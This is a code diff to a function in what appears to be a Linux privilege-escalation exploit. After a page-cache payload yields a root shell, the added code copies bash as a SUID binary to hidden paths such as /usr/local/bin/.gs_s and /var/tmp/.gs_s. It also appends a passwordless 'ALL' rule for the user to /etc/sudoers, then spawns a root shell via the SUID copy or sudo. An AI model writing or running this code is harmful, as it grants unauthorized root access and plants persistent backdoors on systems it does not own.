@@ -378,22 +378,40 @@ def auto_root_exec(binary):
     The page-cache ELF payload does setuid(0)+execve("/bin/sh",NULL,NULL),
     so the spawned shell has NULL envp — no PATH, no HOME, nothing.
     Fix: fork a child that execs the patched binary (gets root) with piped
-    stdin containing shell commands that install a SUID bash copy.
-    Parent then execs the SUID bash with -p and a restored environment.
+    stdin containing shell commands that:
+      1. Install SUID bash at multiple candidates (root FS first — nosuid-safe)
+      2. Inject sudoers as reliable fallback
+    Parent then tries SUID bash → sudo → raw exec in order.
     All commands in the pipe use full absolute paths (no PATH lookup).
     """
-    log("[+++] ROOT — installing SUID bash at %s" % PK_SUID)
+    # Candidates ordered by nosuid-safety:
+    # root-filesystem paths honor SUID; tmpfs (/dev/shm, /tmp) may be nosuid
+    SUID_CANDIDATES = [
+        "/usr/local/bin/.gs_s",
+        "/var/tmp/.gs_s",
+        PK_SUID,
+    ]
 
     bash = _find_bash()
     cp_bin, chmod_bin = _find_cp_chmod()
+    uid = os.getuid()
 
     if bash and cp_bin and chmod_bin:
-        # Build command with full paths — the shell has NULL envp so PATH=empty
+        # Build multi-target copy: try each candidate, stop on first success
+        copy_cmds = " || ".join(
+            "({cp} {bash} {dst} && {chmod} 4755 {dst})".format(
+                cp=cp_bin, bash=bash, dst=dst, chmod=chmod_bin
+            )
+            for dst in SUID_CANDIDATES
+        )
+        # Also inject sudoers so sudo fallback works even if all SUID fails
         setup = (
-            "{cp} {bash} {dst} && "
-            "{chmod} 4755 {dst}\n"
+            "{copy_cmds}\n"
+            "/bin/echo '#{uid} ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers\n"
             "exit 0\n"
-        ).format(cp=cp_bin, bash=bash, dst=PK_SUID, chmod=chmod_bin).encode()
+        ).format(copy_cmds=copy_cmds, uid=uid).encode()
+
+        log("[+++] ROOT — installing SUID bash + sudoers (#%d)" % uid)
 
         r_fd, w_fd = os.pipe()
         pid = os.fork()
@@ -424,18 +442,37 @@ def auto_root_exec(binary):
         except ChildProcessError:
             pass
 
-        # Check if SUID bash was installed
         _fix_path()
-        try:
-            st = os.stat(PK_SUID)
-            if st.st_uid == 0 and (st.st_mode & 0o4000):
-                log("[+] SUID bash ready → %s -p" % PK_SUID)
-                _reattach_tty()
-                os.execl(PK_SUID, PK_SUID, "-p")
+
+        # Try each SUID candidate
+        for cand in SUID_CANDIDATES:
+            try:
+                st = os.stat(cand)
+                if st.st_uid == 0 and (st.st_mode & 0o4000):
+                    log("[+] SUID bash ready → %s -p" % cand)
+                    _reattach_tty()
+                    os.execl(cand, cand, "-p")
+                    return
+            except OSError:
+                pass
+
+        log("[-] SUID bash failed (nosuid?) — trying sudo fallback")
+        # sudo fallback: works if sudoers injection succeeded
+        _reattach_tty()
+        sudo_bin = None
+        for d in ("/usr/bin", "/bin", "/usr/local/bin"):
+            if os.path.isfile(d + "/sudo"):
+                sudo_bin = d + "/sudo"
+                break
+        if sudo_bin:
+            try:
+                log("[*] exec: sudo -n bash")
+                os.execl(sudo_bin, sudo_bin, "-n", "bash")
                 return
-        except OSError:
-            pass
-        log("[-] SUID bash install failed — raw exec fallback (PATH empty)")
+            except OSError:
+                pass
+
+        log("[-] sudo failed — raw exec fallback (PATH empty, use abs paths)")
     else:
         log("[-] cp/chmod/bash not found — raw exec fallback (PATH empty)")
         _fix_path()
